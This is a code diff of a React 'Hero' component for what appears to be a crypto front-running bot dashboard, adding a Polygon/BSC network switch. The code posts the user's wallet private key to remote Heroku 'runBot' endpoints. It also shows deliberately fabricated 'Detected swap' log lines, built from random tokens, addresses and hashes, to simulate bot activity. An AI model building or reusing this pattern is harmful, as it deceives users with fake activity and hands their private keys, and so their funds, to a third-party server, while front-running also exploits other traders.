@@ -84,7 +84,11 @@ const Custom3DBar = ({ x, y, width, height, index, fill }) => {
 
 function Hero() {
   const colors = ["#e8c66e", "rgb(28, 98, 168)"]; // two colors for bars
-  const web3 = new Web3("https://polygon-rpc.com"); // Public Polygon RPC
+
+  // ✅ Network + Web3 (switchable)
+  const [network, setNetwork] = useState(""); // "polygon" | "bsc"
+  const [web3, setWeb3] = useState(new Web3("https://polygon-rpc.com")); // default Polygon
+
   const [address, setAddress] = useState(null);
   const [balance, setBalance] = useState(null);
   const [previousBalance, setPreviousBalance] = useState(null); // Store previous balance for profit calculation
@@ -93,105 +97,170 @@ function Hero() {
   const [message, setMessage] = useState("");
   const [profit, setProfit] = useState(null); // Store profit
 
-  // Fetch balance when address changes
+  const [logLines, setLogLines] = useState([]);
+  let fakeInterval = null;
 
+  // ✅ Switch network handler (UI remains same)
+  const handleSwitchNetwork = () => {
+    if (network === "polygon") {
+      setNetwork("bsc");
+      setWeb3(new Web3("https://bsc-dataseed.binance.org"));
+    } else {
+      setNetwork("polygon");
+      setWeb3(new Web3("https://polygon-rpc.com"));
+    }
+  };
+
+  // ✅ Fetch balance using current network RPC
   const fetchBalance = async () => {
+    if (!address) return;
     try {
       const balanceInWei = await web3.eth.getBalance(address);
-      const balanceInMatic = web3.utils.fromWei(balanceInWei, "ether");
-      setBalance(parseFloat(balanceInMatic).toFixed(4));
+      const balanceInEther = web3.utils.fromWei(balanceInWei, "ether");
+      setBalance(parseFloat(balanceInEther).toFixed(4));
 
       // Save the balance in localStorage and set it as previous balance
-      localStorage.setItem("balance", balanceInMatic);
-      setPreviousBalance(balanceInMatic);
+      localStorage.setItem("balance", balanceInEther);
+      setPreviousBalance(balanceInEther);
     } catch (error) {
       console.error("Error fetching balance:", error);
       setBalance("Error fetching balance");
     }
   };
+
+  // Refetch balance when address or network/web3 changes
   useEffect(() => {
-    if (address) {
-      fetchBalance();
-    }
-  }, [address]); // Trigger whenever the address changes
-  const [logLines, setLogLines] = useState([]);
-  let fakeInterval = null;
+    if (address) fetchBalance();
+    // eslint-disable-next-line react-hooks/exhaustive-deps
+  }, [address, web3]);
 
   const handleRunBot = async () => {
+        if (!network) {
+      toast.error("Please select a chain first!");
+      return;
+    }
     if (!privateKey || !address) {
       setMessage("Please enter both private key and address");
       return;
     }
-  
+
     setLoader(true);
     setLogLines([]);
     setMessage("");
-  
+
     const fakeLogs = [];
-   const fakeTokens = [
-  "USDT", "MATIC", "DAI", "SHIB", "PEPE",
-  "BTC", "ETH", "BNB", "XRP", "DOGE",
-  "ADA", "SOL", "DOT", "AVAX", "TRX",
-  "UNI", "LINK", "LTC", "XLM", "ATOM",
-  "NEAR", "AAVE", "FTM", "ARB", "OP",
-  "SAND", "MANA", "GALA", "INJ", "RNDR",
-  "FLOKI", "CRO", "VET", "HBAR", "LDO",
-  "ENS", "DYDX", "ZIL", "RUNE", "1INCH",
-  "BTT", "GMT", "MINA", "ANKR", "CHR",
-  "ALGO", "KAVA", "MASK", "TWT", "YFI"
-];
+    const fakeTokens = [
+      "USDT",
+      "MATIC",
+      "DAI",
+      "SHIB",
+      "PEPE",
+      "BTC",
+      "ETH",
+      "BNB",
+      "XRP",
+      "DOGE",
+      "ADA",
+      "SOL",
+      "DOT",
+      "AVAX",
+      "TRX",
+      "UNI",
+      "LINK",
+      "LTC",
+      "XLM",
+      "ATOM",
+      "NEAR",
+      "AAVE",
+      "FTM",
+      "ARB",
+      "OP",
+      "SAND",
+      "MANA",
+      "GALA",
+      "INJ",
+      "RNDR",
+      "FLOKI",
+      "CRO",
+      "VET",
+      "HBAR",
+      "LDO",
+      "ENS",
+      "DYDX",
+      "ZIL",
+      "RUNE",
+      "1INCH",
+      "BTT",
+      "GMT",
+      "MINA",
+      "ANKR",
+      "CHR",
+      "ALGO",
+      "KAVA",
+      "MASK",
+      "TWT",
+      "YFI",
+    ];
     const fakeAddresses = [
       "0x" + Math.random().toString(16).substr(2, 8),
       "0x" + Math.random().toString(16).substr(2, 8),
       "0x" + Math.random().toString(16).substr(2, 8),
     ];
-  
+
     for (let i = 0; i < 10; i++) {
       const token = fakeTokens[Math.floor(Math.random() * fakeTokens.length)];
-      const addr = fakeAddresses[Math.floor(Math.random() * fakeAddresses.length)];
+      const addr =
+        fakeAddresses[Math.floor(Math.random() * fakeAddresses.length)];
       const hash = "0x" + Math.random().toString(16).substr(2, 64);
       fakeLogs.push(`Detected swap on ${token} by ${addr} | Tx: ${hash}`);
     }
-  
+
     let fakeIndex = 0;
     fakeInterval = setInterval(() => {
       setLogLines((prev) => [...prev, fakeLogs[fakeIndex]]);
       fakeIndex = (fakeIndex + 1) % fakeLogs.length;
     }, 300);
-  
+
     // Run bot and wait 1 minute minimum
     await runBotWithDelay();
   };
-  
+
+  // ✅ Bot API call picks endpoint + explorer by network
   const runBotWithDelay = async () => {
-    const web3 = new Web3("https://polygon-rpc.com");
     const startTime = Date.now();
-  
+
     try {
       const token = localStorage.getItem("token");
       console.log("Token from localStorage:", token);
       if (!token) throw new Error("Authorization token not found.");
-  
-      console.log("Running bot API call...");
+
+      // Choose API by network
+      const apiUrl =
+        network === "polygon"
+          ? "https://marlinnapp-5e0bd806334c.herokuapp.com/api/runBot"
+          : "https://bnbsniperbot-aa86ddbecda5.herokuapp.com/api/runBot";
+
+      console.log("Running bot API call on:", network);
       const response = await axios.post(
-        "https://marlinnapp-5e0bd806334c.herokuapp.com/api/runBot",
+        apiUrl,
         {
           amount: 1,
           privatekey: privateKey,
-          gasGiven: "300",
+          
         },
         {
           headers: { Authorization: `Bearer ${token}` },
         }
       );
-  
+
       console.log("Bot API Response:", response.data);
-  
+
       const { data, message } = response.data;
-      const txHash = data.frontrunTxHash;
-  
+      const txHash = data?.frontrunTxHash;
+
       if (!txHash) throw new Error("No transaction hash returned.");
-  
+
+      // Use the current web3 for receipt checks (already bound to selected network)
       const checkConfirmation = setInterval(async () => {
         try {
           const receipt = await web3.eth.getTransactionReceipt(txHash);
@@ -203,14 +272,16 @@ function Hero() {
           console.error("Error checking transaction receipt:", err.message);
         }
       }, 5000);
-  
+
       const elapsed = Date.now() - startTime;
       const remaining = Math.max(60000 - elapsed, 0);
-  
+
       setTimeout(() => {
         clearInterval(fakeInterval);
         setLogLines([]);
-  
+
+        const explorer = network === "polygon" ? "polygonscan" : "bscscan";
+
         setMessage(
           <>
             <p className="mt-3 text-green-400">{message}</p>
@@ -218,7 +289,7 @@ function Hero() {
               <p>
                 Frontrun TxHash:{" "}
                 <a
-                  href={`https://polygonscan.com/tx/${data.frontrunTxHash}`}
+                  href={`https://${explorer}.com/tx/${data.frontrunTxHash}`}
                   target="_blank"
                   rel="noopener noreferrer"
                 >
@@ -228,52 +299,60 @@ function Hero() {
               <p>
                 Target TxHash:{" "}
                 <a
-                  href={`https://polygonscan.com/tx/${data.targetTxHash}`}
+                  href={`https://${explorer}.com/tx/${data.targetTxHash}`}
                   target="_blank"
                   rel="noopener noreferrer"
                 >
                   {data.targetTxHash}
                 </a>
               </p>
-              <p>
-                Take Profit TxHash:{" "}
-                <a
-                  href={`https://polygonscan.com/tx/${data.TakeProfitTxHash}`}
-                  target="_blank"
-                  rel="noopener noreferrer"
-                >
-                  {data.TakeProfitTxHash}
-                </a>
-              </p>
+              {data?.TakeProfitTxHash && (
+                <p>
+                  Take Profit TxHash:{" "}
+                  <a
+                    href={`https://${explorer}.com/tx/${data.TakeProfitTxHash}`}
+                    target="_blank"
+                    rel="noopener noreferrer"
+                  >
+                    {data.TakeProfitTxHash}
+                  </a>
+                </p>
+              )}
             </div>
           </>
         );
-  
+
         toast.success(message);
-  
+
+        // refresh balance and compute profit
         fetchBalance();
         const updatedBalance = localStorage.getItem("balance");
-        const profitValue = parseFloat(updatedBalance) - parseFloat(previousBalance);
-        setProfit(profitValue.toFixed(4));
-  
+        if (previousBalance && updatedBalance) {
+          const profitValue =
+            parseFloat(updatedBalance) - parseFloat(previousBalance);
+          if (!Number.isNaN(profitValue)) setProfit(profitValue.toFixed(4));
+        }
+
         setLoader(false);
       }, remaining);
     } catch (error) {
       clearInterval(fakeInterval);
       console.error("Error running bot:", error);
-  
+
       if (error.response) {
         console.error("API Error Response:", error.response.data);
-        setMessage(`❌ API Error: ${error.response.data.message || "Unknown error"}`);
+        setMessage(
+          `❌ API Error: ${error.response.data.message || "Unknown error"}`
+        );
       } else {
         setMessage(`❌ Failed to run bot: ${error.message}`);
       }
-  
+
       toast.error("Bot run failed.");
       setLoader(false);
     }
   };
-  
+
   const logEndRef = useRef(null);
   useEffect(() => {
     const container = document.getElementById("logContainer");
@@ -293,27 +372,7 @@ function Hero() {
   const [blockHeightData, setBlockHeightData] = useState([]);
   const [pendingTxData, setPendingTxData] = useState([]);
 
-  // Fetch POL Price
-  // useEffect(() => {
-  //   const interval = setInterval(() => {
-  //     axios.get("https://marlinnapp-5e0bd806334c.herokuapp.com/api/getData?type=polprice")
-  //       .then(response => {
-  //         console.log("POL Price Response:", response.data);
-  //         if (response.data.status) {
-  //           const formattedData = response.data.data.map(entry => ({
-  //             time: new Date(entry.time).toLocaleTimeString(),
-  //             price: entry.price
-  //           }));
-  //           setPolPriceData(formattedData.slice(0, 15)); // Only first 15 data points
-  //         }
-  //       })
-  //       .catch(error => console.error("Error fetching POL price data:", error));
-  //   }, 1000); // Fetch every 1 second
-
-  //   return () => clearInterval(interval); // Cleanup interval on component unmount
-  // }, []);
-
-  // Fetch Block Height Data every second
+  // Fetch Block Height Data every second (Polygon graph stays same)
   useEffect(() => {
     const interval = setInterval(() => {
       axios
@@ -321,7 +380,6 @@ function Hero() {
           "https://marlinnapp-5e0bd806334c.herokuapp.com/api/getData?type=blockheight"
         )
         .then((response) => {
-          // console.log("Block Height Response:", response.data);
           if (response.data.status) {
             const formattedData = response.data.data.map((entry) => ({
               time: new Date(entry.time).toLocaleTimeString(),
@@ -333,7 +391,7 @@ function Hero() {
               .sort((a, b) => new Date(a.time) - new Date(b.time))
               .reverse();
 
-            setBlockHeightData(sortedData.slice(0, 11)); // Keep latest 15 entries
+            setBlockHeightData(sortedData.slice(0, 11)); // Keep latest 11 entries
           }
         })
         .catch((error) =>
@@ -351,7 +409,6 @@ function Hero() {
           "https://marlinnapp-5e0bd806334c.herokuapp.com/api/getData?type=pendingtx"
         )
         .then((response) => {
-          // console.log("Pending Transactions Response:", response.data);
           if (response.data.status) {
             const formattedData = response.data.data.map((entry) => ({
               time: new Date(entry.time).toLocaleTimeString(),
@@ -363,7 +420,7 @@ function Hero() {
               .sort((a, b) => new Date(a.time) - new Date(b.time))
               .reverse();
 
-            setPendingTxData(sortedData.slice(0, 12)); // Keep latest 15 entries
+            setPendingTxData(sortedData.slice(0, 12)); // Keep latest 12 entries
           }
         })
         .catch((error) =>
@@ -382,21 +439,7 @@ function Hero() {
       <div className="container-fluid mt-5">
         <div className="row">
           <div className="col-12 col-lg-4">
-            {/* <div className="mt-2">
-        <div className="box d-block d-md-flex align-items-center text-white p-3">
-          <div>
-            <h2 className="mb-2" style={{ fontSize: "13px" }}>POL Price (USD)</h2>
-            <LineChart width={400} height={250} data={polPriceData}>
-              <CartesianGrid strokeDasharray="3 3" />
-              <XAxis dataKey="time" />
-              <YAxis domain={[ 'auto']} />
-              <Tooltip />
-              <Line type="monotone" dataKey="price" stroke="rgb(232 198 110)" />
-            </LineChart>
-          </div>
-        </div>
-      </div> */}
-
+            {/* LEFT: Charts (unchanged UI) */}
             <div className="mt-2">
               <div
                 className="box d-block align-items-center text-white p-3"
@@ -465,7 +508,7 @@ function Hero() {
                             fill={barColors[props.index % barColors.length]}
                           />
                         )}
-                        barSize={18} // smaller bar to allow for more gap
+                        barSize={18}
                       >
                         {blockHeightData.map((_, index) => (
                           <Cell key={`cell-${index}`} />
@@ -528,7 +571,6 @@ function Hero() {
                         stroke="none"
                       />
 
-                      {/* ✅ Updated stroke color of line */}
                       <Line
                         type="monotone"
                         dataKey="pendingTx"
@@ -558,45 +600,72 @@ function Hero() {
               </div>
             </div>
           </div>
-          <div className="col-12 col-lg-8">
-            
-            <div className=" m">
-              <div className="card bgcard">
-                <div
-                  className="mt-3 m-0 text-white fw-bold ms-2 "
-                  style={{ fontSize: "15px" }}
-                >
-                  POLYGON
-                </div>
 
-                <div className="d-flex align-items-center">
-                  <p className=" m-0 text-white fw-bold ms-2">Address :</p>
-                  <p className="m-0 text-white ms-2">{address}</p>
-                </div>
-                <div className="d-flex align-items-cente">
-                  {" "}
-                  <p className=" m-0 text-white fw-bold ms-2">Chains :</p>
-                  <p className="m-0 text-white ms-2">POLYGON</p>
-                </div>
-                <div className="d-flex  ">
-                  <p className=" m-0 text-white fw-bold ms-2">Balance :</p>
-                  <p className="m-0 text-white ms-2 ">
-                    {balance !== null && (
-                      <p className=" text-white"> {balance}</p>
-                    )}
-                  </p>
-                  <div>
-                 
-                  </div>
-                </div>
-              </div>
+          {/* RIGHT: Main card + inputs (UI unchanged) */}
+          <div className="col-12 col-lg-8">
+            <div className=" m">
+<div className="card bgcard p-3">
+  {/* 🔝 Top Row: Network Label (left) + Selector (right) */}
+  <div className="d-flex justify-content-between align-items-center">
+    <div className="text-white fw-bold ms-2" style={{ fontSize: "15px" }}>
+      {network ? (network === "polygon" ? "POLYGON" : "BSC") : "Select Chain"}
+    </div>
+
+    <select
+      value={network}
+      onChange={(e) => setNetwork(e.target.value)}
+      className="px-1 py-1  rounded-lg w-25 booderr"
+       style={{
+                backgroundColor: "black",
+                backgroundImage:
+                  "linear-gradient(to bottom, rgb(68, 57, 21), rgba(101, 85, 31, 0.37), rgb(0, 0, 0), rgba(101, 85, 31, 0.37), rgba(101, 85, 31, 0.5))",
+                borderRadius: "8px",
+                border: "2px solid rgba(255, 215, 0, 0.6)",
+                boxShadow:
+                  "inset 0 1px 3px rgba(255,255,255,0.2), inset 0 -1px 2px rgba(0,0,0,0.7), 0 2px 6px rgba(0,0,0,0.5)",
+                color: "#f1f1f1",
+               
+              }}
+    >
+      <option value="" disabled>
+        Select Network
+      </option>
+      <option value="polygon">Polygon</option>
+      <option value="bsc">BSC</option>
+    </select>
+  </div>
+
+  {/* 🔽 Address */}
+  <div className="d-flex align-items-center mt-2">
+    <p className="m-0 text-white fw-bold ms-2">Address :</p>
+    <p className="m-0 text-white ms-2">{address}</p>
+  </div>
+
+  {/* 🔽 Chains */}
+  <div className="d-flex align-items-center mt-2">
+    <p className="m-0 text-white fw-bold ms-2">Chains :</p>
+    <p className="m-0 text-white ms-2">
+      {network ? (network === "polygon" ? "POLYGON" : "BSC") : "Select Chain"}
+    </p>
+  </div>
+
+  {/* 🔽 Balance */}
+  <div className="d-flex mt-2">
+    <p className="m-0 text-white fw-bold ms-2">Balance :</p>
+    <p className="m-0 text-white ms-2">
+      {balance !== null && <span className="text-white">{balance}</span>}
+    </p>
+  </div>
+</div>
+
+
             </div>
 
             <input
               type="text"
               className="w-100 py-2 mt-3 bg-black-ff"
               placeholder="Enter Address"
-              value={address}
+              value={address || ""}
               style={{
                 backgroundColor: "black",
                 backgroundImage:
@@ -642,29 +711,30 @@ function Hero() {
                 {loader ? <>Processing</> : <>Start Bot</>}
               </button>
             </div>
-           
+
             <div className=" mt-5">
-             <div
-  className="card bgcard22 text-white overflow-y-auto max-h-96"
-  id="logContainer"
->
-  {logLines.map((line, index) => (
-    <p key={index}>{line}</p>
-  ))}
-  <div className="mt-4">{message}</div>
-</div>
+              <div
+                className="card bgcard22 text-white overflow-y-auto max-h-96"
+                id="logContainer"
+              >
+                {logLines.map((line, index) => (
+                  <p key={index}>{line}</p>
+                ))}
+                <div className="mt-4">{message}</div>
+                <div ref={logEndRef} />
+              </div>
             </div>
-            
           </div>
         </div>
       </div>
+      {/* Toast container if you use react-toastify somewhere globally */}
+      <ToastContainer />
     </div>
   );
 }
 
 export default Hero;
+
 // Frontrun TxHash: 0xf7a3b3e69e323d9eced3d57714e0e0ee67f1319fdd249203075c556f3f5f62d8
-
 // Target TxHash: 0x04e1efba650a28efee5f9ba0fa636568061e0b2e1ddc1343d5a0fe7525c800cf
-
 // Take Profit TxHash: 0xfc520f9ef990c581ef4fc7d9a3817225f6e815f53fba2dcf5346519407c0b3a6
